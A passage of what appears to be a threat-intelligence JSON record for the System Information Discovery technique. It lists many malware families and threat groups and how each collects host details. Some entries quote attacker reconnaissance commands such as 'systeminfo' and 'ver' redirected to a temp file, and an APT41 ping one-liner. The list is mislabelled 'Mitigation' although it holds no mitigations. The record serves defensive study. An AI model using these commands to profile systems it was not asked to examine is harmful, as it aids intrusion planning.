    "Description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Tools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version).[1] System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.[2][3]Infrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.[4][5][6]",
    "Mitigation": [
      {
        "id": "S0065",
        "name": "4H RAT",
        "description": "4H RAT sends an OS version identifier in its beacons.[7]"
      },
      {
        "id": "S1028",
        "name": "Action RAT",
        "description": "Action RAT has the ability to collect the hostname, OS version, and OS architecture of an infected host.[8]"
      },
      {
        "id": "G0018",
        "name": "admin@338",
        "description": "admin@338 actors used the following commands after exploiting a machine with LOWBALL malware to obtain information about the OS: ver >> %temp%\\download systeminfo >> %temp%\\download[9]"
      },
      {
        "id": "S0045",
        "name": "ADVSTORESHELL",
        "description": "ADVSTORESHELL can run Systeminfo to gather information about the victim.[10][11]"
      },
      {
        "id": "S0331",
        "name": "Agent Tesla",
        "description": "Agent Tesla can collect the system's computer name and also has the capability to collect information on the processor, memory, OS, and video card from the system.[12][13][14]"
      },
      {
        "id": "S1025",
        "name": "Amadey",
        "description": "Amadey has collected the computer name and OS version from a compromised machine.[15][16]"
      },
      {
        "id": "S0504",
        "name": "Anchor",
        "description": "Anchor can determine the hostname and linux version on a compromised host.[17]"
      },
      {
        "id": "S0584",
        "name": "AppleJeus",
        "description": "AppleJeus has collected the victim host information after infection.[18]"
      },
      {
        "id": "S0622",
        "name": "AppleSeed",
        "description": "AppleSeed can identify the OS version of a targeted system.[19]"
      },
      {
        "id": "G0026",
        "name": "APT18",
        "description": "APT18 can collect system information from the victim’s machine.[20]"
      },
      {
        "id": "G0073",
        "name": "APT19",
        "description": "APT19 collected system architecture information. APT19 used an HTTP malware variant and a Port 22 malware variant to gather the hostname and CPU information from the victim’s machine.[21][22]"
      },
      {
        "id": "G0022",
        "name": "APT3",
        "description": "APT3 has a tool that can obtain information about the local system.[23][24]"
      },
      {
        "id": "G0050",
        "name": "APT32",
        "description": "APT32 has collected the OS version and computer name from victims. One of the group's backdoors can also query the Windows Registry to gather system information, and another macOS backdoor performs a fingerprint of the machine on its first connection to the C&C server. APT32 executed shellcode to identify the name of the infected host.[25][26][27][28]"
      },
      {
        "id": "G0067",
        "name": "APT37",
        "description": "APT37 collects the computer name, the BIOS model, and execution path.[29]"
      },
      {
        "id": "G0082",
        "name": "APT38",
        "description": "APT38 has attempted to get detailed information about a compromised host, including the operating system, version, patches, hotfixes, and service packs.[30]"
      },
      {
        "id": "G0143",
        "name": "Aquatic Panda",
        "description": "Aquatic Panda has used native OS commands to understand privilege levels and system details.[31]"
      },
      {
        "id": "S0456",
        "name": "Aria-body",
        "description": "Aria-body has the ability to identify the hostname, computer name, Windows version, processor speed, machine GUID, and disk information on a compromised host.[32]"
      },
      {
        "id": "S0373",
        "name": "Astaroth",
        "description": "Astaroth collects the machine name and keyboard language from the system. [33][34]"
      },
      {
        "id": "S1087",
        "name": "AsyncRAT",
        "description": "AsyncRAT can check the disk size through the values obtained with DeviceInfo.[35]"
      },
      {
        "id": "S0438",
        "name": "Attor",
        "description": "Attor monitors the free disk space on the system.[36]"
      },
      {
        "id": "S1029",
        "name": "AuTo Stealer",
        "description": "AuTo Stealer has the ability to collect the hostname and OS information from an infected host.[8]"
      },
      {
        "id": "S0473",
        "name": "Avenger",
        "description": "Avenger has the ability to identify the host volume ID and the OS architecture on a compromised host.[37]"
      },
      {
        "id": "S0344",
        "name": "Azorult",
        "description": "Azorult can collect the machine information, system architecture, the OS version, computer name, Windows product name, the number of CPU cores, video card information, and the system language.[38][39]"
      },
      {
        "id": "S0638",
        "name": "Babuk",
        "description": "Babuk can enumerate disk volumes, get disk information, and query service status.[40]"
      },
      {
        "id": "S0414",
        "name": "BabyShark",
        "description": "BabyShark has executed the ver command.[41]"
      },
      {
        "id": "S0475",
        "name": "BackConfig",
        "description": "BackConfig has the ability to gather the victim's computer name.[42]"
      },
      {
        "id": "S0093",
        "name": "Backdoor.Oldrea",
        "description": "Backdoor.Oldrea collects information about the OS and computer name.[43][44]"
      },
      {
        "id": "S0031",
        "name": "BACKSPACE",
        "description": "During its initial execution, BACKSPACE extracts operating system information from the infected host.[45]"
      },
      {
        "id": "S0245",
        "name": "BADCALL",
        "description": "BADCALL collects the computer name and host name on the compromised system.[46]"
      },
      {
        "id": "S0642",
        "name": "BADFLICK",
        "description": "BADFLICK has captured victim computer name, memory space, and CPU details.[47]"
      },
      {
        "id": "S1081",
        "name": "BADHATCH",
        "description": "BADHATCH can obtain current system information from a compromised machine such as the SHELL PID, PSVERSION, HOSTNAME, LOGONSERVER, LASTBOOTUP, UPTIME, drive information, OS type/version, bitness, and hostname.[48][49]"
      },
      {
        "id": "S0337",
        "name": "BadPatch",
        "description": "BadPatch collects the OS system, OS version, MAC address, and the computer name from the victim’s machine.[50]"
      },
      {
        "id": "S0234",
        "name": "Bandook",
        "description": "Bandook can collect information about the drives available on the system.[51]"
      },
      {
        "id": "S0239",
        "name": "Bankshot",
        "description": "Bankshot gathers system information, network addresses, disk type, disk free space, and the operation system version.[52][53]"
      },
      {
        "id": "S0534",
        "name": "Bazar",
        "description": "Bazar can fingerprint architecture, computer name, and OS version on the compromised host. Bazar can also check if the Russian language is installed on the infected machine and terminate if it is found.[54][55]"
      },
      {
        "id": "S0017",
        "name": "BISCUIT",
        "description": "BISCUIT has a command to collect the processor type, operation system, computer name, uptime, and whether the system is a laptop or PC.[56]"
      },
      {
        "id": "S0268",
        "name": "Bisonal",
        "description": "Bisonal has used commands and API calls to gather system information.[57][58][59]"
      },
      {
        "id": "S1070",
        "name": "Black Basta",
        "description": "Black Basta can enumerate volumes and collect system boot configuration and CPU information.[60][61]"
      },
      {
        "id": "S1068",
        "name": "BlackCat",
        "description": "BlackCat can obtain the computer name and UUID, and enumerate local drives.[62]"
      },
      {
        "id": "S0089",
        "name": "BlackEnergy",
        "description": "BlackEnergy has used Systeminfo to gather the OS version, as well as information on the system configuration, BIOS, the motherboard, and the processor.[63][64]"
      },
      {
        "id": "S0564",
        "name": "BlackMould",
        "description": "BlackMould can enumerate local drives on a compromised host.[65]"
      },
      {
        "id": "S0520",
        "name": "BLINDINGCAN",
        "description": "BLINDINGCAN has collected from a victim machine the system name, processor information, OS version, and disk information, including type and free space available.[66]"
      },
      {
        "id": "G0108",
        "name": "Blue Mockingbird",
        "description": "Blue Mockingbird has collected hardware details for the victim's system, including CPU and memory information.[67]"
      },
      {
        "id": "S0657",
        "name": "BLUELIGHT",
        "description": "BLUELIGHT has collected the computer name and OS version from victim machines.[68]"
      },
      {
        "id": "S0486",
        "name": "Bonadan",
        "description": "Bonadan has discovered the OS version, CPU model, and RAM size of the system it has been installed on.[69]"
      },
      {
        "id": "S0635",
        "name": "BoomBox",
        "description": "BoomBox can enumerate the hostname, domain, and IP of a compromised host.[70]"
      },
      {
        "id": "S0252",
        "name": "Brave Prince",
        "description": "Brave Prince collects hard drive content and system configuration information.[71]"
      },
      {
        "id": "S0043",
        "name": "BUBBLEWRAP",
        "description": "BUBBLEWRAP collects system information, including the operating system version and hostname.[9]"
      },
      {
        "id": "S0471",
        "name": "build_downer",
        "description": "build_downer has the ability to send system volume information to C2.[37]"
      },
      {
        "id": "S1039",
        "name": "Bumblebee",
        "description": "Bumblebee can enumerate the OS version and domain on a targeted system.[72][73][74]"
      },
      {
        "id": "S0482",
        "name": "Bundlore",
        "description": "Bundlore will enumerate the macOS version to determine which follow-on behaviors to execute using /usr/bin/sw_vers -productVersion.[75][3]"
      },
      {
        "id": "C0017",
        "name": "C0017",
        "description": "During C0017, APT41 issued ping -n 1 ((cmd /c dir c:\\|findstr Number).split()[-1]+ commands to find the volume serial number of compromised systems.[76]"
      },
      {
        "id": "S0693",
        "name": "CaddyWiper",
        "description": "CaddyWiper can use DsRoleGetPrimaryDomainInformation to determine the role of the infected machine. CaddyWiper can also halt execution if the compromised host is identified as a domain controller.[77][78]"
      },
      {
        "id": "S0454",
        "name": "Cadelspy",
        "description": "Cadelspy has the ability to discover information about the compromised host.[79]"
      },
      {
        "id": "S0351",
        "name": "Cannon",
        "description": "Cannon can gather system information from the victim’s machine such as the OS version, machine name, and drive information.[80][81]"
      },
      {
        "id": "S0484",
        "name": "Carberp",
        "description": "Carberp has collected the operating system version from the infected system.[82]"
      },
      {
        "id": "S0348",
        "name": "Cardinal RAT",
        "description": "Cardinal RAT can collect the hostname, Microsoft Windows version, and processor architecture from a victim machine.[83]"
      },
      {
        "id": "S0462",
        "name": "CARROTBAT",
        "description": "CARROTBAT has the ability to determine the operating system of the compromised host and whether Windows is being run with x86 or x64 architecture.[84][85]"
      },
      {
        "id": "S0572",
        "name": "Caterpillar WebShell",
        "description": "Caterpillar WebShell has a module to gather information from the compromrised asset, including the computer version, computer name, IIS version, and more.[86]"
      },
      {
        "id": "S0631",
        "name": "Chaes",
        "description": "Chaes has collected system information, including the machine name and OS version.[87]"
      },
      {
        "id": "S0674",
        "name": "CharmPower",
        "description": "CharmPower can enumerate the OS version and computer name on a targeted system.[88]"
      },
      {
        "id": "S0144",
        "name": "ChChes",
        "description": "ChChes collects the victim hostname, window resolution, and Microsoft Windows version.[89][90]"
      },
      {
        "id": "G0114",
        "name": "Chimera",
        "description": "Chimera has used fsutil fsinfo drives, systeminfo, and vssadmin list shadows for system information including shadow volumes and drive information.[91]"
      },
      {
        "id": "S0667",
        "name": "Chrommme",
        "description": "Chrommme has the ability to list drives and obtain the computer name of a compromised host.[92]"
      },
      {
        "id": "S0660",
        "name": "Clambling",
        "description": "Clambling can discover the hostname, computer name, and Windows version of a targeted machine.[93][94]"
      },
      {
        "id": "S0106",
        "name": "cmd",
        "description": "cmd can be used to find information about the operating system.[95]"
      },
      {
        "id": "S0244",
        "name": "Comnie",
        "description": "Comnie collects the hostname of the victim machine.[96]"
      },
      {
        "id": "G0142",
        "name": "Confucius",
        "description": "Confucius has used a file stealer that can examine system drives, including those other than the C drive.[97]"
      },
      {
        "id": "S0137",
        "name": "CORESHELL",
        "description": "CORESHELL collects hostname, volume serial number and OS version data from the victim and sends the information to its C2 server.[98]"
      },
      {
        "id": "S0046",
        "name": "CozyCar",
        "description": "A system info module in CozyCar gathers information on the victim host’s configuration.[99]"
      },
      {
        "id": "S0488",
        "name": "CrackMapExec",
        "description": "CrackMapExec can enumerate the system drives and associated system name.[100]"
      },
      {
        "id": "S0115",
        "name": "Crimson",
        "description": "Crimson contains a command to collect the victim PC name, disk drive information, and operating system.[101][102][103]"
      },
      {
        "id": "S0625",
        "name": "Cuba",
        "description": "Cuba can enumerate local drives, disk type, and disk free space.[104]"
      },
      {
        "id": "S0687",
        "name": "Cyclops Blink",
        "description": "Cyclops Blink has the ability to query device information.[105]"
      },
      {
        "id": "S0334",
        "name": "DarkComet",
        "description": "DarkComet can collect the computer name, RAM used, and operating system version from the victim’s machine.[106][107]"
      },
      {
        "id": "G0012",
        "name": "Darkhotel",
        "description": "Darkhotel has collected the hostname, OS version, service pack version, and the processor architecture from the victim’s machine.[108][109]"
      },
      {
        "id": "S1066",
        "name": "DarkTortilla",
        "description": "DarkTortilla can obtain system information by querying the Win32_ComputerSystem, Win32_BIOS, Win32_MotherboardDevice, Win32_PnPEntity, and Win32_DiskDrive WMI objects.[110]"
      },
      {
        "id": "S0673",
        "name": "DarkWatchman",
        "description": "DarkWatchman can collect the OS version, system architecture, uptime, and computer name.[111]"
      },
      {
        "id": "S1052",
        "name": "DEADEYE",
        "description": "DEADEYE can enumerate a victim computer's volume serial number and host name.[76]"
      },
      {
        "id": "S0616",
        "name": "DEATHRANSOM",
        "description": "DEATHRANSOM can enumerate logical drives on a target system.[112]"
      },
      {
        "id": "S0354",
        "name": "Denis",
        "description": "Denis collects OS information and the computer name from the victim’s machine.[113][114]"
      },
      {
        "id": "S0021",
        "name": "Derusbi",
        "description": "Derusbi gathers the name of the local host, version of GNU Compiler Collection (GCC), and the system information about the CPU, machine, and operating system.[115]"
      },
      {
        "id": "S0659",
        "name": "Diavol",
        "description": "Diavol can collect the computer name and OS version from the system.[116]"
      },
      {
        "id": "S0472",
        "name": "down_new",
        "description": "down_new has the ability to identify the system volume information of a compromised host.[37]"
      },
      {
        "id": "S0186",
        "name": "DownPaper",
        "description": "DownPaper collects the victim host name and serial number, and then sends the information to the C2 server.[117]"
      },
      {
        "id": "S0384",
        "name": "Dridex",
        "description": "Dridex has collected the computer name and OS architecture information from the system.[118]"
      },
      {
        "id": "S0547",
        "name": "DropBook",
        "description": "DropBook has checked for the presence of Arabic language in the infected machine's settings.[119]"
      },
      {
        "id": "S0105",
        "name": "dsquery",
        "description": "dsquery has the ability to enumerate various information, such as the operating system and host name, for systems within a domain.[76]"
      },
      {
        "id": "S0567",
        "name": "Dtrack",
        "description": "Dtrack can collect the victim's computer name, hostname and adapter information to create a unique identifier.[120][121]"
      },
      {
        "id": "S0062",
        "name": "DustySky",
        "description": "DustySky extracts basic information about the operating system.[122]"
      },
      {
        "id": "S0024",
        "name": "Dyre",
        "description": "Dyre has the ability to identify the computer name, OS version, and hardware configuration on a compromised host.[123]"
      },
      {
        "id": "S0554",
        "name": "Egregor",
        "description": "Egregor can perform a language check of the infected system and can query the CPU information (cupid).[124][125]"
      },
      {
        "id": "S0081",
        "name": "Elise",
        "description": "Elise executes systeminfo after initial communication is made to the remote server.[126]"
      },
      {
        "id": "S0082",
        "name": "Emissary",
        "description": "Emissary has the capability to execute ver and systeminfo commands.[127]"
      },
      {
        "id": "S0363",
        "name": "Empire",
        "description": "Empire can enumerate host system information like OS, architecture, domain name, applied patches, and more.[128][129]"
      },
      {
        "id": "S0634",
        "name": "EnvyScout",
        "description": "EnvyScout can determine whether the ISO payload was received by a Windows or iOS device.[70]"
      },
      {
        "id": "S0091",
        "name": "Epic",
        "description": "Epic collects the OS version, hardware information, computer name, available system memory status, disk space information, and system and user language settings.[130]"
      },
      {
        "id": "S0568",
        "name": "EVILNUM",
        "description": "EVILNUM can obtain the computer name from the victim's system.[131]"
      },
      {
        "id": "S0569",
        "name": "Explosive",
        "description": "Explosive has collected the computer name from the infected host.[132]"
      },
      {
        "id": "S0181",
        "name": "FALLCHILL",
        "description": "FALLCHILL can collect operating system (OS) version information, processor information, system name, and information about installed disks from the victim.[133]"
      },
      {
        "id": "S0512",
        "name": "FatDuke",
        "description": "FatDuke can collect the user name, Windows version, computer name, and available space on discs from a compromised host.[134]"
      },
      {
        "id": "S0171",
        "name": "Felismus",
        "description": "Felismus collects the system information, including hostname and OS version, and sends it to the C2 server.[135]"
      },
      {
        "id": "S0267",
        "name": "FELIXROOT",
        "description": "FELIXROOT collects the victim’s computer name, processor architecture, OS version, volume serial number, and system type.[136][137]"
      },
      {
        "id": "S0679",
        "name": "Ferocious",
        "description": "Ferocious can use GET.WORKSPACE in Microsoft Excel to determine the OS version of the compromised host.[138]"
      },
      {
        "id": "G1016",
        "name": "FIN13",
        "description": "FIN13 has collected local host information by utilizing Windows commands systeminfo, fsutil, and fsinfo. FIN13 has also utilized a compromised Symantex Altiris console and LanDesk account to retrieve host information.[139][140]"
      },
      {
        "id": "G0061",
        "name": "FIN8",
        "description": "FIN8 has used PowerShell Scripts to check the architecture of a compromised machine before the selection of a 32-bit or 64-bit version of a malicious .NET loader.[141]"
      },
      {
        "id": "S0355",
        "name": "Final1stspy",
        "description": "Final1stspy obtains victim Microsoft Windows version information and CPU architecture.[142]"
      },
      {
        "id": "S0182",
        "name": "FinFisher",
        "description": "FinFisher checks if the victim OS is 32 or 64-bit.[143][144]"
      },
      {
        "id": "S0381",
        "name": "FlawedAmmyy",
        "description": "FlawedAmmyy can collect the victim's operating system and computer name during the initial infection.[145]"
      },
      {
        "id": "C0001",
        "name": "Frankenstein",
        "description": "During Frankenstein, the threat actors used Empire to obtain the compromised machine's name.[129]"
      },
      {
        "id": "S1044",
        "name": "FunnyDream",
        "description": "FunnyDream can enumerate all logical drives on a targeted machine.[146]"
      },
      {
        "id": "C0007",
        "name": "FunnyDream",
        "description": "During FunnyDream, the threat actors used Systeminfo to collect information on targeted hosts.[146]"
      },
      {
        "id": "S0410",
        "name": "Fysbis",
        "description": "Fysbis has used the command ls /etc | egrep -e\"fedora*|debian*|gentoo*|mandriva*|mandrake*|meego*|redhat*|lsb-*|sun-*|SUSE*|release\" to determine which Linux OS version is running.[147]"
      },
      {
        "id": "G0047",
        "name": "Gamaredon Group",
        "description": "A Gamaredon Group file stealer can gather the victim's computer name and drive serial numbers to send to a C2 server.[148][149][150]"
      },
      {
        "id": "S0666",
        "name": "Gelsemium",
        "description": "Gelsemium can determine the operating system and whether a targeted machine has a 32 or 64 bit architecture.[92]"
      },
      {
        "id": "S0460",
        "name": "Get2",
        "description": "Get2 has the ability to identify the computer name and Windows version of an infected host.[151]"
      },
      {
        "id": "S0032",
        "name": "gh0st RAT",
        "description": "gh0st RAT has gathered system architecture, processor, OS configuration, and installed hardware information.[152]"
      },
      {
        "id": "S0249",
        "name": "Gold Dragon",
        "description": "Gold Dragon collects endpoint information using the systeminfo command.[71]"
      },
      {
        "id": "S0493",
        "name": "GoldenSpy",
        "description": "GoldenSpy has gathered operating system information.[153]"
      },
      {
        "id": "S0531",
        "name": "Grandoreiro",
        "description": "Grandoreiro can collect the computer name and OS version from a compromised host.[154]"
      },
      {
        "id": "S0237",
        "name": "GravityRAT",
        "description": "GravityRAT collects the MAC address, computer name, and CPU information.[155]"
      },
      {
        "id": "S0690",
        "name": "Green Lambert",
        "description": "Green Lambert can use uname to identify the operating system name, version, and processor type.[156][157]"
      },
      {
        "id": "S0417",
        "name": "GRIFFON",
        "description": "GRIFFON has used a reconnaissance module that can be used to retrieve information about a victim's computer, including the resolution of the workstation .[158]"
      },
      {
        "id": "S0632",
        "name": "GrimAgent",
        "description": "GrimAgent can collect the OS, and build version on a compromised host.[159]"
      },
      {
        "id": "S0151",
        "name": "HALFBAKED",
        "description": "HALFBAKED can obtain information about the OS, processor, and BIOS.[160]"
      },
      {
        "id": "S0214",
        "name": "HAPPYWORK",
        "description": "can collect system information, including computer name, system manufacturer, IsDebuggerPresent state, and execution path.[161]"
      },
      {
        "id": "S0391",
        "name": "HAWKBALL",
        "description": "HAWKBALL can collect the OS version, architecture information, and computer name.[162]"
      },
      {
        "id": "S0617",
        "name": "HELLOKITTY",
        "description": "HELLOKITTY can enumerate logical drives on a target system.[112]"
      },
      {
        "id": "S0697",
        "name": "HermeticWiper",
        "description": "HermeticWiper can determine the OS version, bitness, and enumerate physical drives on a targeted host.[163][164][165][166]"
      },
      {
        "id": "G1001",
        "name": "HEXANE",
        "description": "HEXANE has collected the hostname of a compromised machine.[167]"
      },
      {
        "id": "S1027",
        "name": "Heyoka Backdoor",
        "description": "Heyoka Backdoor can enumerate drives on a compromised host.[168]"
      },
      {
        "id": "G0126",
        "name": "Higaisa",
        "description": "Higaisa collected the system volume serial number, GUID, and computer name.[169][170]"
      },
      {
        "id": "S0601",
        "name": "Hildegard",
        "description": "Hildegard has collected the host's OS, CPU, and memory information.[171]"
      },
      {
        "id": "S0376",
        "name": "HOPLIGHT",
        "description": "HOPLIGHT has been observed collecting victim machine information like OS version, volume information, and more.[172]"
      },
      {
        "id": "S0431",
        "name": "HotCroissant",
        "description": "HotCroissant has the ability to determine if the current user is an administrator, Windows product name, processor name, screen resolution, and physical RAM of the infected host.[173]"
      },
      {
        "id": "S0203",
        "name": "Hydraq",
        "description": "Hydraq creates a backdoor through which remote attackers can retrieve information such as computer name, OS version, processor speed, memory size, and CPU speed.[174]"
      },
      {
        "id": "S1022",
        "name": "IceApple",
        "description": "The IceApple Server Variable Dumper module iterates over all server variables present for the current request and returns them to the adversary.[175]"
      },
      {
        "id": "S0483",
        "name": "IcedID",
        "description": "IcedID has the ability to identify the computer name and OS version on a compromised host.[176]"
      },
      {
        "id": "G0100",
        "name": "Inception",
        "description": "Inception has used a reconnaissance module to gather information about the operating system and hardware on the infected host.[177]"
      },
      {
        "id": "S0604",
        "name": "Industroyer",
        "description": "Industroyer collects the victim machine’s Windows GUID.[178]"
      },
      {
        "id": "S0259",
        "name": "InnaputRAT",
        "description": "InnaputRAT gathers volume drive information and system information.[179]"
      },
      {
        "id": "S0260",
        "name": "InvisiMole",
        "description": "InvisiMole can gather information on the mapped drives, OS version, computer name, DEP policy, memory size, and system volume serial number.[180][181]"
      },
      {
        "id": "S0015",
        "name": "Ixeshe",
        "description": "Ixeshe collects the computer name of the victim's system during the initial infection.[182]"
      },
      {
        "id": "S0044",
        "name": "JHUHUGIT",
        "description": "JHUHUGIT obtains a build identifier as well as victim hard drive information from Windows registry key HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum. Another JHUHUGIT variant gathers the victim storage volume serial number and the storage device name.[183][184]"
      },
      {
        "id": "S0201",
        "name": "JPIN",
        "description": "JPIN can obtain system information such as OS version and disk space.[185]"
      },
      {
        "id": "S0283",
        "name": "jRAT",
        "description": "jRAT collects information about the OS (version, build type, install date) as well as system up-time upon receiving a connection from a backdoor.[186]"
      },
      {
        "id": "S0215",
        "name": "KARAE",
        "description": "KARAE can collect system information.[161]"
      },
      {
        "id": "S0088",
        "name": "Kasidet",
        "description": "Kasidet has the ability to obtain a victim's system name and operating system version.[187]"
      },
      {
        "id": "S0265",
        "name": "Kazuar",
        "description": "Kazuar gathers information on the system and local drives.[188]"
      },
      {
        "id": "G0004",
        "name": "Ke3chang",
        "description": "Ke3chang performs operating system information discovery using systeminfo and has used implants to identify the system language and computer name.[189][190][191]"
      },
      {
        "id": "S0585",
        "name": "Kerrdown",
        "description": "Kerrdown has the ability to determine if the compromised host is running a 32 or 64 bit OS architecture.[192]"
      },
      {
        "id": "S0487",
        "name": "Kessel",
        "description": "Kessel has collected the system architecture, OS version, and MAC address information.[69]"
      },
      {
        "id": "S1020",
        "name": "Kevin",
        "description": "Kevin can enumerate the OS version and hostname of a targeted machine.[167]"
      },
      {
        "id": "S0387",
        "name": "KeyBoy",
        "description": "KeyBoy can gather extended system information, such as information about the operating system, disks, and memory.[193][194]"
      },
      {
        "id": "S0271",
        "name": "KEYMARBLE",
        "description": "KEYMARBLE has the capability to collect the computer name, language settings, the OS version, CPU information, disk devices, and time elapsed since system start.[195]"
      },
      {
        "id": "S0526",
        "name": "KGH_SPY",
        "description": "KGH_SPY can collect drive information from a compromised host.[196]"
      },
      {
        "id": "S0607",
        "name": "KillDisk",
        "description": "KillDisk retrieves the hard disk name by calling the CreateFileA to \\.\\PHYSICALDRIVE0 API.[197]"
      },
      {
        "id": "G0094",
        "name": "Kimsuky",
        "description": "Kimsuky has enumerated drives, OS type, OS version, and other information using a script or the \"systeminfo\" command.[198][199]"
      },
      {
        "id": "S0250",
        "name": "Koadic",
        "description": "Koadic can obtain the OS version and build, computer name, and processor architecture from a compromised host.[200]"
      },
      {
        "id": "S0641",
        "name": "Kobalos",
        "description": "Kobalos can record the hostname and kernel version of the target machine.[201]"
      },
      {
        "id": "S0669",
        "name": "KOCTOPUS",
        "description": "KOCTOPUS has checked the OS version using wmic.exe and the find command.[200]"
      },
      {
        "id": "S0156",
        "name": "KOMPROGO",
        "description": "KOMPROGO is capable of retrieving information about the infected system.[202]"
      },
      {
        "id": "S0356",
        "name": "KONNI",
        "description": "KONNI can gather the OS version, architecture information, connected drives, hostname, RAM size, and disk space information from the victim’s machine and has used cmd /c systeminfo command to get a snapshot of the current system state of the target machine.[203][204][205]"
      },
      {
        "id": "S1075",
        "name": "KOPILUWAK",
        "description": "KOPILUWAK can discover logical drive information on compromised hosts.[206]"
      },
      {
        "id": "S0236",
        "name": "Kwampirs",
        "description": "Kwampirs collects OS version information such as registered owner details, manufacturer details, processor type, available storage, installed patches, hostname, version info, system date, and other system information by using the commands systeminfo, net config workstation, hostname, ver, set, and date /t.[207]"
      },
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "Several Lazarus Group malware families collect information on the type and version of the victim OS, as well as the victim computer name and CPU information. A Destover-like variant used by Lazarus Group also collects disk space information and sends it to its C2 server.[208][209][210][211][212][213]"
      },
      {
        "id": "S0395",
        "name": "LightNeuron",
        "description": "LightNeuron gathers the victim computer name using the Win32 API call GetComputerName.[214]"
      },
      {
        "id": "S0211",
        "name": "Linfo",
        "description": "Linfo creates a backdoor through which remote attackers can retrieve system information.[215]"
      },
      {
        "id": "S0513",
        "name": "LiteDuke",
        "description": "LiteDuke can enumerate the CPUID and BIOS version on a compromised system.[134]"
      },
      {
        "id": "S0680",
        "name": "LitePower",
        "description": "LitePower has the ability to list local drives and enumerate the OS architecture.[138]"
      },
      {
        "id": "S0681",
        "name": "Lizar",
        "description": "Lizar can collect the computer name from the machine,.[216]"
      },
      {
        "id": "S0447",
        "name": "Lokibot",
        "description": "Lokibot has the ability to discover the computer name and Windows product name/version.[217]"
      },
      {
        "id": "S0451",
        "name": "LoudMiner",
        "description": "LoudMiner has monitored CPU usage.[218]"
      },
      {
        "id": "S0532",
        "name": "Lucifer",
        "description": "Lucifer can collect the computer name, system architecture, default language, and processor frequency of a compromised host.[219]"
      },
      {
        "id": "S0409",
        "name": "Machete",
        "description": "Machete collects the hostname of the target computer.[220]"
      },
      {
        "id": "S1016",
        "name": "MacMa",
        "description": "MacMa can collect information about a compromised computer, including: Hardware UUID, Mac serial number, macOS version, and disk sizes.[221]"
      },
      {
        "id": "S1048",
        "name": "macOS.OSAMiner",
        "description": "macOS.OSAMiner can gather the device serial number and has checked to ensure there is enough disk space using the Unix utility df.[222]"
      },
      {
        "id": "S1060",
        "name": "Mafalda",
        "description": "Mafalda can collect the computer name and enumerate all drives on a compromised host.[223][224]"
      },
      {
        "id": "G0059",
        "name": "Magic Hound",
        "description": "Magic Hound malware has used a PowerShell command to check the victim system architecture to determine if it is an x64 machine. Other malware has obtained the OS version, UUID, and computer/host name to send to the C2 server.[225][226][227]"
      },
      {
        "id": "S0652",
        "name": "MarkiRAT",
        "description": "MarkiRAT can obtain the computer name from a compromised host.[228]"
      },
      {
        "id": "S0449",
        "name": "Maze",
        "description": "Maze has checked the language of the infected system using the \"GetUSerDefaultUILanguage\" function.[229]"
      },
      {
        "id": "S1059",
        "name": "metaMain",
        "description": "metaMain can collect the computer name from a compromised host.[224]"
      },
      {
        "id": "S0455",
        "name": "Metamorfo",
        "description": "Metamorfo has collected the hostname and operating system version from the compromised host.[230][231][232]"
      },
      {
        "id": "S0688",
        "name": "Meteor",
        "description": "Meteor has the ability to discover the hostname of a compromised host.[233]"
      },
      {
        "id": "S0339",
        "name": "Micropsia",
        "description": "Micropsia gathers the hostname and OS version from the victim’s machine.[234][235]"
      },
      {
        "id": "S1015",
        "name": "Milan",
        "description": "Milan can enumerate the targeted machine's name and GUID.[236][237]"
      },
      {
        "id": "S0051",
        "name": "MiniDuke",
        "description": "MiniDuke can gather the hostname on a compromised machine.[134]"
      },
      {
        "id": "S0280",
        "name": "MirageFox",
        "description": "MirageFox can collect CPU and architecture information from the victim’s machine.[238]"
      },
      {
        "id": "S0084",
        "name": "Mis-Type",
        "description": "The initial beacon packet for Mis-Type contains the operating system version and file system of the victim.[239]"
      },
      {
        "id": "S0083",
        "name": "Misdat",
        "description": "The initial beacon packet for Misdat contains the operating system version of the victim.[239]"
      },
      {
        "id": "S0079",
        "name": "MobileOrder",
        "description": "MobileOrder has a command to upload to its C2 server victim mobile device information, including IMEI, IMSI, SIM card serial number, phone number, Android version, and other information.[240]"
      },
      {
        "id": "S0553",
        "name": "MoleNet",
        "description": "MoleNet can collect information about the about the system.[119]"
      },
      {
        "id": "S1026",
        "name": "Mongall",
        "description": "Mongall can identify drives on compromised hosts and retrieve the hostname via gethostbyname.[168]"
      },
      {
        "id": "S0149",
        "name": "MoonWind",
        "description": "MoonWind can obtain the victim hostname, Windows version, RAM amount, number of drives, and screen resolution.[241]"
      },
      {
        "id": "S0284",
        "name": "More_eggs",
        "description": "More_eggs has the capability to gather the OS version and computer name.[242][243]"
      },
      {
        "id": "G1009",
        "name": "Moses Staff",
        "description": "Moses Staff collected information about the infected host, including the machine names and OS architecture.[244]"
      },
      {
        "id": "G0069",
        "name": "MuddyWater",
        "description": "MuddyWater has used malware that can collect the victim’s OS version and machine name.[245][246][247][248][249]"
      },
      {
        "id": "S0233",
        "name": "MURKYTOP",
        "description": "MURKYTOP has the capability to retrieve information about the OS.[250]"
      },
      {
        "id": "G0129",
        "name": "Mustang Panda",
        "description": "Mustang Panda has gathered system information using systeminfo.[251]"
      },
      {
        "id": "S0205",
        "name": "Naid",
        "description": "Naid collects a unique identifier (UID) from a compromised host.[252]"
      },
      {
        "id": "S0228",
        "name": "NanHaiShu",
        "description": "NanHaiShu can gather the victim computer name and serial number.[253]"
      },
      {
        "id": "S0247",
        "name": "NavRAT",
        "description": "NavRAT uses systeminfo on a victim’s machine.[254]"
      },
      {
        "id": "S0272",
        "name": "NDiskMonitor",
        "description": "NDiskMonitor obtains the victim computer name and encrypts the information to send over its C2 channel.[255]"
      },
      {
        "id": "S0630",
        "name": "Nebulae",
        "description": "Nebulae can discover logical drive information including the drive type, free space, and volume information.[256]"
      },
      {
        "id": "S0691",
        "name": "Neoichor",
        "description": "Neoichor can collect the OS version and computer name from a compromised host.[191]"
      },
      {
